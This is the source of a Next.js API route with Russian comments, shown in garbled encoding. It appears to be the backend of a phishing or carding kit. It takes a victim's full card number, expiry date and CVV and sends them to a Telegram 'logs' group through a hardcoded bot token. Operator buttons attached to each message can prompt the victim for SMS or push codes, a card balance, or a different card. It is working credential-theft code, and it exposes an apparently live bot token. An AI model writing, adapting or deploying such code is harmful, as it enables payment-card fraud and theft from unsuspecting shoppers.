import { NextRequest, NextResponse } from 'next/server';
import { Telegraf } from 'telegraf';

// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –±–æ—Ç–∞
const BOT_TOKEN = '8477608805:AAF6-UwbhdQTClns7RQqeBXMbiJ1zPWrJAA';
const LOGS_GROUP_ID = '-1002636314382';

const bot = new Telegraf(BOT_TOKEN);

export async function POST(request: NextRequest) {
  try {
    const { cardNumber, cardExp, cardCvv, price, orderId } = await request.json();

    // –í–∞–ª–∏–¥–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö
    if (!cardNumber || !cardExp || !cardCvv || !price) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      );
    }

    // –°–æ–∑–¥–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –≥—Ä—É–ø–ø—ã –ª–æ–≥–æ–≤
    const logMessage = `
üí≥ <b>–ù–û–í–´–ô –ü–õ–ê–¢–ï–ñ</b>

üìã <b>–î–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã:</b>
‚îî –ù–æ–º–µ—Ä: <code>${cardNumber}</code>
‚îî –°—Ä–æ–∫: <code>${cardExp}</code>
‚îî CVV: <code>${cardCvv}</code>

üí∞ <b>–°—É–º–º–∞:</b> ${price} AED
üÜî <b>–ó–∞–∫–∞–∑:</b> #${orderId}

‚è∞ <b>–í—Ä–µ–º—è:</b> ${new Date().toLocaleString('ru-RU')}
üìä <b>–°—Ç–∞—Ç—É—Å:</b> –û–∂–∏–¥–∞–Ω–∏–µ
    `;

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –≥—Ä—É–ø–ø—É –ª–æ–≥–æ–≤
    const message = await bot.telegram.sendMessage(LOGS_GROUP_ID, logMessage, {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: '–û–∂–∏–¥–∞–Ω–∏–µ', callback_data: 'nothing' }],
          [{ text: 'üëÅ', callback_data: `eye_${orderId}` }],
          [
            { text: 'üõë –û—Ç–∫–∞–∑–∞—Ç—å—Å—è', callback_data: `log_${orderId}_leave` },
            { text: '‚úÖ –£—Å–ø–µ—Ö', callback_data: `log_${orderId}_setStatus_success` }
          ],
          [
            { text: 'SMS', callback_data: `log_${orderId}_setStatus_sms` },
            { text: 'PUSH', callback_data: `log_${orderId}_setStatus_push` }
          ],
          [
            { text: '–ö–ê–†–¢–ê', callback_data: `log_${orderId}_setStatus_card` },
            { text: '–ë–ê–õ–ê–ù–°', callback_data: `log_${orderId}_setStatus_balance` }
          ],
          [
            { text: '–ù–ï –ë–¨–ï–¢–°–Ø', callback_data: `log_${orderId}_setStatus_skip` },
            { text: '–°–ú–ï–ù–ò–¢–¨ –ö–ê–†–¢–£', callback_data: `log_${orderId}_setStatus_change` }
          ],
          [
            { text: '–ö–ê–°–¢–û–ú –í–û–ü–†–û–°', callback_data: `custom_${orderId}` },
            { text: '–ö–ê–°–¢–û–ú –û–®–ò–ë–ö–ê', callback_data: `customError_${orderId}` }
          ]
        ]
      }
    });

    return NextResponse.json({
      success: true,
      logId: orderId,
      messageId: message.message_id,
      status: 'pending'
    });

  } catch (error) {
    console.error('Payment log creation error:', error);
    return NextResponse.json(
      { error: 'Failed to create payment log' },
      { status: 500 }
    );
  }
}
